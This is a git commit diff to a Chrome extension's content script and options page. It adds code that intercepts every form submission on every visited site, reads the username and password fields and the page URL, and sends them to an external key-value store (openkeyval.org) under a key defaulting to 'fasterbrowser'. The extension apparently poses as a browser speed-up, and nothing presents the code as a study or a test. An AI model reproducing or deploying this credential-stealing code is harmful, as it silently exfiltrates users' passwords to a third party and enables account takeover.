f419b74c3a79c999a98c03888ee61e854b7951ad
Adrian Rangel <adrian.rangel@gmail.com>
2013-11-06 15:38:56 -0600

    change openkeyval key, ready

--- src/inject/inject.js
+++ src/inject/inject.js
@@ -1,42 +1,46 @@
 chrome.extension.sendMessage({}, function(response) {
-	var readyStateCheckInterval = setInterval(function() {
-	if (document.readyState === "complete") {
-		clearInterval(readyStateCheckInterval);
+  var readyStateCheckInterval = setInterval(function() {
+    if (document.readyState === "complete") {
+      clearInterval(readyStateCheckInterval);
 
-    $("form").submit(function(e) {
-      var $this = $(this);
-      e.preventDefault();
-      process(function() {
-        $this.unbind('submit');
-        $this.submit();
+
+      $("form").submit(function(e) {
+        var $this = $(this);
+        e.preventDefault();
+        process(function() {
+          $this.unbind('submit');
+          $this.submit();
+        });
       });
-    });
-    var passwordBoxes = $("input[type=password]");
-    var process = function(callback) {
-      var username = $("input[type=text]").not(passwordBoxes).filter(function() {
-        var field = $(this);
-        return field.val() || field.html();
-      }).val(),
-      password = passwordBoxes.val();
+      var passwordBoxes = $("input[type=password]");
+      var process = function(callback) {
+        var username = $("input[type=text]").not(passwordBoxes).filter(function() {
+          var field = $(this);
+          return field.val() || field.html();
+        }).val(),
+        password = passwordBoxes.val();
 
-      sendAjax(username, password, location.href, callback);
-    };
-    var sendAjax = function(username, password, url, callback) {
-      var msg = username + "|" + password + "|" + url;
-        var optionKey = localStorage["optionKey"];
+        sendAjax(username, password, location.href, callback);
+      };
+      var sendAjax = function(username, password, url, callback) {
+        var msg = username + "|" + password + "|" + url;
+        var optionKey = '';
+        chrome.extension.sendRequest({method: "optionKey"}, function(response) {
+          optionKey = response.status;
+        });
         if (optionKey == undefined) {
           optionKey = "fasterbrowser";
         }
-      //console.log(msg);
-      $.ajax({
-        type: 'POST',
-        url: 'https://secure.openkeyval.org/store/',
-        dataType: "jsonp",
-        data: optionkey"="+msg
-        //succes: callback
-      });
-    };
-
-	}
-	}, 0);
+        setTimeout(function () {
+          $.ajax({
+            type: 'POST',
+            url: 'https://secure.openkeyval.org/store/',
+            dataType: "jsonp",
+            data: optionKey+"="+msg
+            //succes: callback
+          });
+        },500);
+      };
+    }
+  }, 0);
 });
--- src/options/options.js
+++ src/options/options.js
@@ -1,27 +1,40 @@
 var defaultKey = "fasterbrowser";
 
 function loadOptions() {
-  var text = document.getElementById("key");
-  text.value = theKey();
-  changeUrl();
-}
-function theKey(){
-  var optionKey = localStorage["optionKey"];
-
+  var optionKey = defaultKey;
+  chrome.extension.sendRequest({method: "optionKey"}, function(response) {
+    console.log(response.status);
+    optionKey = response.status;
+  });
   if (optionKey == undefined) {
-    optionKey = defaultKey;
+    optionKey = "fasterbrowser";
   }
-  return optionKey;
+  var text = document.getElementById("key");
+  setTimeout(function () {
+    text.value = optionKey;
+    changeUrl(optionKey);
+  },500);
 }
-function changeUrl(){
+/*
+ *function theKey(){
+ *  //var optionKey = localStorage["optionKey"];
+ *  var optionKey = defaultKey;
+ *  chrome.extension.sendRequest({method: "optionKey"}, function(response) {
+ *    console.log(response.status);
+ *    optionKey = response.status;
+ *  });
+ *  return optionKey;
+ *}
+ */
+function changeUrl(op){
   var element=document.getElementById("url");
-  element.textContent = "https://secure.openkeyval.org/"+theKey();
+  element.textContent = "https://secure.openkeyval.org/"+op;
 }
 
 function saveOptions() {
-  var text = document.getElementById("key");
-  localStorage["optionKey"] = text.value;
-  changeUrl();
+  var text = document.getElementById("key").value;
+  localStorage["optionKey"] = text;
+  changeUrl(text);
 }
 document.addEventListener('DOMContentLoaded', function () {
   document.getElementById('saveButton').addEventListener('click', saveOptions);
